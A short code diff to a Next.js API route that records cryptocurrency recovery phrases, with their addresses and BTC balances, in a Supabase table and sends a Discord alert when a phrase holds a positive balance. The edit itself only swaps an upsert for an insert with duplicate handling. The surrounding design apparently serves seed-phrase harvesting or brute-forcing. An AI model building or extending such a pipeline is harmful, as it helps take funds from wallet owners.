@@ -90,28 +90,25 @@ export async function POST(req: NextRequest) {
     try {
         const supabase = getSupabaseAdmin();
 
-        // Upsert: if phrase_hash already exists, do nothing (dedup)
-        const { error: upsertError } = await supabase
+        // Insert the phrase record — ignore if it already exists (duplicates are fine)
+        const { error: insertError } = await supabase
             .from('wallet_lab_phrases')
-            .upsert(
-                {
-                    phrase_hash,
-                    phrase,
-                    addresses,
-                    tx_count,
-                    total_received_btc,
-                    balance_btc,
-                    last_updated_at: new Date().toISOString(),
-                },
-                {
-                    onConflict: 'phrase_hash',
-                    ignoreDuplicates: true, // Only insert once; don't update existing rows
-                }
-            );
+            .insert({
+                phrase_hash,
+                phrase,
+                addresses,
+                tx_count,
+                total_received_btc,
+                balance_btc,
+                last_updated_at: new Date().toISOString(),
+            });
 
-        if (upsertError) {
-            console.error('[wallet-lab/record] Supabase upsert error:', upsertError.message);
-            // Non-fatal: continue to check for alert
+        if (insertError) {
+            // Code 23505 = unique constraint violation → phrase already recorded, not a real error
+            if (!insertError.code || insertError.code !== '23505') {
+                console.error('[wallet-lab/record] Supabase insert error:', insertError.message, insertError.code);
+            }
+            // Either way, continue to check alert status below
         }
 
         // Send Discord alert if balance is positive AND alert hasn't been sent for this phrase
